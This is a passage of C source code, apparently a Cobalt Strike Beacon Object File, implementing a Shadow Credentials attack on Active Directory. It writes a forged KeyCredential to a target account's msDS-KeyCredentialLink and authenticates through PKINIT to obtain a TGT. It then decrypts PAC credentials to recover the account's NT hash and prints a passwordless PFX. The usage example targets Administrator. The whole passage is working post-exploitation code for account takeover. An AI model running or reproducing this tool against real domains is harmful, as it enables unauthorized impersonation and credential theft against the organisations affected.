        if (serverNonce) free(serverNonce);
        return;
    }

    decrypted = KerberosDecrypt(ETYPE_AES256_CTS_HMAC_SHA1, KRB_KEY_USAGE_AS_REP_ENCPART,
                                 replyKey, 32, encPart, encPartLen, &decryptedLen);
    free(encPart);

    if (!decrypted) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to decrypt enc-part");
        free(kdcPubKey);
        if (serverNonce) free(serverNonce);
        return;
    }

    /* Step 6: Extract session key */
    sessionKey = ExtractSessionKey(decrypted, decryptedLen, &sessionKeyLen, &sessionKeyType);
    free(decrypted);

    if (!sessionKey) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Could not extract session key");
        free(kdcPubKey);
        if (serverNonce) free(serverNonce);
        return;
    }
    memcpy(g_sessionKey, sessionKey, sessionKeyLen);

    /* Output TGT in kirbi format */
    {
        int tgtLen;
        BYTE* tgt = ExtractTicketFromAsRep(asRep, asRepLen, &tgtLen);
        if (tgt && tgtLen > 0) {
            OutputKirbi(tgt, tgtLen, sessionKey, sessionKeyLen, sessionKeyType, user, realm);
            free(tgt);
        }
    }

    /* Step 7: Look for PA-PAC-CREDENTIALS and decrypt */
    int pacCredLen;
    BYTE* pacCred = ExtractPaPacCredentials(asRep, asRepLen, &pacCredLen);
    if (pacCred) {
        int decCredLen;
        BYTE* decCred = KerberosDecrypt(sessionKeyType, KRB_KEY_USAGE_PAC_CREDENTIAL,
                                        sessionKey, sessionKeyLen, pacCred, pacCredLen, &decCredLen);
        free(pacCred);

        if (decCred) {
            ParsePacCredentialData(decCred, decCredLen);
            free(decCred);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to decrypt PA-PAC-CREDENTIALS");
        }
    } else {
        /* Fallback to U2U */
        int tgtLen;
        BYTE* tgt = ExtractTicketFromAsRep(asRep, asRepLen, &tgtLen);
        if (tgt && tgtLen > 0) {
            PerformU2U(kdcHost, user, realm, tgt, tgtLen, sessionKey, sessionKeyLen, replyKey, 32);
            free(tgt);
        }
    }

    /* Cleanup */
    free(kdcPubKey);
    free(sessionKey);
    if (serverNonce) free(serverNonce);
}

/*
 * =============================================================================
 * Get KDC for Domain
 * =============================================================================
 */

static void GetKdcForDomain(const char* domain, char* kdcHost, int kdcHostLen) {
    WCHAR wDomain[256];
    PDOMAIN_CONTROLLER_INFOW dcInfo = NULL;

    MultiByteToWideChar(CP_ACP, 0, domain, -1, wDomain, 256);

    if (DsGetDcNameW(NULL, wDomain, NULL, NULL, DS_IS_DNS_NAME | DS_RETURN_DNS_NAME, &dcInfo) == ERROR_SUCCESS) {
        WideCharToMultiByte(CP_ACP, 0, dcInfo->DomainControllerName + 2, -1, kdcHost, kdcHostLen, NULL, NULL);
        NetApiBufferFree(dcInfo);
    } else {
        strcpy(kdcHost, domain);
    }
}

/*
 * =============================================================================
 * Main Entry Point
 * =============================================================================
 */

#ifdef BOF
void go(char* args, int alen) {
#else
int main(int argc, char* argv[]) {
    char* args = NULL;
    int alen = 0;
#endif
    char* szTarget = NULL;
    char* szDomain = NULL;
    char* szKdc = NULL;
    WCHAR wszTargetDN[512] = {0};
    BYTE* pbUserSID = NULL;
    DWORD dwUserSIDLen = 0;
    char szSIDString[128] = {0};
    BYTE* pbPublicKey = NULL;
    int nPublicKeyLen = 0;
    BYTE* pbPfx = NULL;
    int nPfxLen = 0;
    BYTE* pbKeyCredBlob = NULL;
    int nKeyCredBlobLen = 0;
    GUID deviceId;
    char kdcBuf[256] = {0};

#ifdef BOF
    /* Parse arguments */
    datap parser;
    BeaconDataParse(&parser, args, alen);
    szTarget = BeaconDataExtract(&parser, NULL);
    szDomain = BeaconDataExtract(&parser, NULL);
    szKdc = BeaconDataExtract(&parser, NULL);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] ShadowCredentials BOF loaded");
#else
    if (argc < 3) {
        printf("Usage: shadowcreds <target> <domain> [kdc]\n");
        printf("Example: shadowcreds Administrator corp.local dc01.corp.local\n");
        return 1;
    }
    szTarget = argv[1];
    szDomain = argv[2];
    szKdc = argc > 3 ? argv[3] : NULL;
#endif

    if (!szTarget || !szTarget[0] || !szDomain || !szDomain[0]) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Usage: shadowcreds <target> <domain> [kdc]");
#ifndef BOF
        return 1;
#else
        return;
#endif
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Shadow Credentials Attack: %s@%s", szTarget, szDomain);

    /* Save domain for cleanup */
    {
        int di;
        for (di = 0; di < 255 && szDomain[di]; di++) {
            g_szDomain[di] = szDomain[di];
        }
        g_szDomain[di] = '\0';
    }

    /* Initialize COM */
    CoInitializeEx(NULL, 0);

    /* Step 1: Lookup target DN and SID */
    if (!LookupUserDNAndSID(szTarget, szDomain, wszTargetDN, 512, &pbUserSID, &dwUserSIDLen)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to lookup target");
        goto cleanup;
    }

    /* Save target DN for cleanup */
    wcscpy(g_wszTargetDN, wszTargetDN);

    /* Convert SID to string for certificate */
    if (pbUserSID && dwUserSIDLen > 0) {
        LPSTR pszSid = NULL;
        if (ConvertSidToStringSidA((PSID)pbUserSID, &pszSid)) {
            strcpy(szSIDString, pszSid);
            LocalFree(pszSid);
        }
    }

    /* Step 2: Generate keypair and certificate */
    if (!GenerateCertificateAndKey(szTarget, szDomain, szSIDString,
                                   &pbPublicKey, &nPublicKeyLen,
                                   &pbPfx, &nPfxLen, &deviceId)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to generate certificate");
        goto cleanup;
    }

    /* Save device ID for display */
    memcpy(&g_deviceId, &deviceId, sizeof(GUID));

    /* Step 3: Build KeyCredential blob */
    pbKeyCredBlob = BuildKeyCredentialBlob(pbPublicKey, nPublicKeyLen, &deviceId, &nKeyCredBlobLen);
    if (!pbKeyCredBlob) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to build KeyCredential blob");
        goto cleanup;
    }

    /* Step 4: Write to msDS-KeyCredentialLink */
    if (!WriteKeyCredentialLink(szDomain, wszTargetDN, pbKeyCredBlob, nKeyCredBlobLen)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to write msDS-KeyCredentialLink");
        BeaconPrintf(CALLBACK_OUTPUT, "[!] You may need GenericWrite/GenericAll on target");
        goto cleanup;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Shadow Credential written (Device ID: %08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X)",
                 deviceId.Data1, deviceId.Data2, deviceId.Data3,
                 deviceId.Data4[0], deviceId.Data4[1], deviceId.Data4[2], deviceId.Data4[3],
                 deviceId.Data4[4], deviceId.Data4[5], deviceId.Data4[6], deviceId.Data4[7]);

    /* Output PFX first */
    {
        DWORD b64Len = 0;
        CryptBinaryToStringA(pbPfx, nPfxLen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &b64Len);
        char* b64 = (char*)malloc(b64Len + 1);
        CryptBinaryToStringA(pbPfx, nPfxLen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, b64, &b64Len);

        BeaconPrintf(CALLBACK_OUTPUT, "[+] PFX (base64, no password):");
        BeaconPrintf(CALLBACK_OUTPUT, "%s", b64);

        free(b64);
    }

    /* Step 5: Authenticate via PKINIT and get NT hash */
    {
        /* Load PFX to get certificate context */
        CRYPT_DATA_BLOB pfxBlob;
        HCERTSTORE hPfxStore;
        PCCERT_CONTEXT pCert;
        char realm[256] = {0};
        int ri;

        pfxBlob.pbData = pbPfx;
        pfxBlob.cbData = nPfxLen;

        hPfxStore = PFXImportCertStore(&pfxBlob, L"", CRYPT_EXPORTABLE | CRYPT_USER_KEYSET);
        if (!hPfxStore) {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to import PFX for PKINIT");
            goto skip_pkinit;
        }

        pCert = CertEnumCertificatesInStore(hPfxStore, NULL);
        if (!pCert) {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] No certificate in PFX store");
            CertCloseStore(hPfxStore, 0);
            goto skip_pkinit;
        }

        /* Get KDC */
        if (szKdc && szKdc[0]) {
            strcpy(kdcBuf, szKdc);
        } else {
            GetKdcForDomain(szDomain, kdcBuf, sizeof(kdcBuf));
        }

        /* Convert domain to uppercase for realm */
        for (ri = 0; szDomain[ri] && ri < 255; ri++) {
            realm[ri] = (szDomain[ri] >= 'a' && szDomain[ri] <= 'z')
                      ? szDomain[ri] - 'a' + 'A' : szDomain[ri];
        }
        realm[ri] = '\0';

        /* Build and send PKINIT AS-REQ */
        int asReqLen;
        BYTE* asReq = BuildPkinitAsReq(pCert, szTarget, szDomain, &asReqLen);

        if (asReq) {
            int asRepLen;
            BYTE* asRep = SendToKdc(kdcBuf, 88, asReq, asReqLen, &asRepLen);

            if (asRep) {
                ProcessAsRep(asRep, asRepLen, pCert, szTarget, realm, kdcBuf);
                free(asRep);
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to receive AS-REP from KDC");
            }

            free(asReq);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to build PKINIT AS-REQ");
        }

        CertFreeCertificateContext(pCert);
        CertCloseStore(hPfxStore, 0);
    }

skip_pkinit:
    /* Cleanup Shadow Credential from target */
    if (g_wszKeyCredValue) {
        if (DeleteKeyCredentialLink(szDomain, wszTargetDN)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Shadow Credential removed from msDS-KeyCredentialLink");
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to remove Shadow Credential");
        }
        free(g_wszKeyCredValue);
        g_wszKeyCredValue = NULL;
    }

cleanup:
    if (pbUserSID) free(pbUserSID);
    if (pbPublicKey) free(pbPublicKey);
    if (pbPfx) free(pbPfx);
    if (pbKeyCredBlob) free(pbKeyCredBlob);

    CoUninitialize();

#ifndef BOF
    return 0;
#endif
}
